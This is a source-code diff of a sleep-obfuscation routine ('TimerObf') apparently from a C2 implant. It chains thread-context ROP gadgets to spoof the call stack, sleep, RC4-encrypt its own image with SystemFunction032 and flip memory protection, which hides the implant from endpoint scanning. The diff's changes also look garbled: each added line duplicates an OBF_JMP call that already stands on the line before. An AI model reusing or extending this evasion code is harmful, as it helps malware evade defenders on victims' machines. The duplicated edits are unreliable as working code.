@@ -505,31 +505,36 @@ BOOL TimerObf(
                     /* perform stack spoofing */
                     if ( Instance->Config.Implant.StackSpoof ) {
                         OBF_JMP( Inc, Instance->Win32.NtGetContextThread )
-                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
+                            OBF_JMP( Inc, Instance->Win32.NtGetContextThread );
+                            Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                         Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                         Inc++;
 
                         OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
-                        Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
+                            OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory );
+                            Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                         Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
                         Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
                         Inc++;
 
                         OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
-                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
+                            OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory );
+                            Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                         Rop[ Inc ].Rdx = U_PTR( &NtTib );
                         Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                         Inc++;
 
                         OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
-                        Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
+                            OBF_JMP( Inc, Instance->Win32.NtSetContextThread );
+                            Rop[ Inc ].Rcx = U_PTR( ThdSrc    );
                         Rop[ Inc ].Rdx = U_PTR( &TimerCtx );
                         Inc++;
                     }
 
                     /* Sleep */
                     OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx )
-                    Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
+                        OBF_JMP( Inc, Instance->Win32.WaitForSingleObjectEx );
+                        Rop[ Inc ].Rcx = U_PTR( NtCurrentProcess() );
                     Rop[ Inc ].Rdx = U_PTR( Delay + TimeOut );
                     Rop[ Inc ].R8  = U_PTR( FALSE );
                     Inc++;
@@ -537,26 +542,30 @@ BOOL TimerObf(
                     /* undo stack spoofing */
                     if ( Instance->Config.Implant.StackSpoof ) {
                         OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
-                        Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
+                            OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory );
+                            Rop[ Inc ].Rcx = U_PTR( &Instance->Teb->NtTib );
                         Rop[ Inc ].Rdx = U_PTR( &BkpTib );
                         Rop[ Inc ].R8  = U_PTR( sizeof( NT_TIB ) );
                         Inc++;
 
                         OBF_JMP( Inc, Instance->Win32.NtSetContextThread )
-                        Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
+                            OBF_JMP( Inc, Instance->Win32.NtSetContextThread );
+                            Rop[ Inc ].Rcx = U_PTR( ThdSrc  );
                         Rop[ Inc ].Rdx = U_PTR( &ThdCtx );
                         Inc++;
                     }
 
                     /* Sys032 */
                     OBF_JMP( Inc, Instance->Win32.SystemFunction032 )
-                    Rop[ Inc ].Rcx = U_PTR( &Img );
+                        OBF_JMP( Inc, Instance->Win32.SystemFunction032 );
+                        Rop[ Inc ].Rcx = U_PTR( &Img );
                     Rop[ Inc ].Rdx = U_PTR( &Key );
                     Inc++;
 
                     /* Protect */
                     OBF_JMP( Inc, Instance->Win32.VirtualProtect )
-                    Rop[ Inc ].Rcx = U_PTR( TxtBase );
+                        OBF_JMP( Inc, Instance->Win32.VirtualProtect );
+                        Rop[ Inc ].Rcx = U_PTR( TxtBase );
                     Rop[ Inc ].Rdx = U_PTR( TxtSize );
                     Rop[ Inc ].R8  = U_PTR( Protect );
                     Rop[ Inc ].R9  = U_PTR( &Value );
@@ -565,7 +574,8 @@ BOOL TimerObf(
                     /* End of Ropchain */
                     Rop[ Inc ].Rip = U_PTR( Instance->Win32.NtSetEvent );
                     OBF_JMP( Inc, Instance->Win32.NtSetEvent )
-                    Rop[ Inc ].Rcx = U_PTR( EvntDelay );
+                        OBF_JMP( Inc, Instance->Win32.NtSetEvent );
+                        Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                     Rop[ Inc ].Rdx = U_PTR( NULL );
                     Inc++;
 
